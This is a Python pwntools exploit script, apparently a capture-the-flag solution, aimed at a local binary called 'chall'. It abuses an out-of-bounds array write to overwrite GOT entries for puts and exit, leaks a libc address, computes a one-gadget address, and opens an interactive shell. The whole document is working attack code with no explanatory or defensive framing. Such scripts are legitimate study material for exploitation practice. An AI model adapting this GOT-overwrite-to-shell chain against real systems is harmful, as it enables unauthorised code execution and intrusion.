from pwn import *
import string
context.log_level = 'debug'

p = process(['./chall'], env={"LD_PRELOAD":"./libc.so.6"})
e = ELF('./chall')

main = 0x400737
setupF = 0x400822
puts_Got = 0x601018
print_Got = 0x601028
print_plt = 0x400600
setbuf_Got = 0x601020
stdout_got = 0x601060
alarm_got = 0x601030
exit_got = 0x601048

setbuf_Index = setbuf_Got//4
print_Index = print_Got//4
puts_Index = puts_Got//4
setup_Index = setupF//4
alarm_Index = alarm_got//4
exit_Index = exit_got//4

mov_edi_jump_rax = 0x4006ac
# 0x00000000004006a9 : je 0x4006b8 ; pop rbp ; mov edi, 0x601060 ; jmp rax


def genMM(memSize, index, data):
    p.sendlineafter('n = ',str(memSize))
    p.sendlineafter('i = ', str(index))
    p.sendlineafter('arr[%d] = '%index, str(data))

# return Main
genMM(-1, puts_Index, main)
# pause()
# ll
genMM(-1, exit_Index, mov_edi_jump_rax)
p.sendlineafter('n = ', str(print_plt))
lib_print = u64(p.recv(6).ljust(8, '\x00'))
lib_base = lib_print-0x11f06a0
one_shot = lib_base+0xe6c84

print(hex(lib_print))
print(hex(lib_base))
print(hex(one_shot))


pause()
genMM(-1, puts_Index, one_shot)


p.interactive()



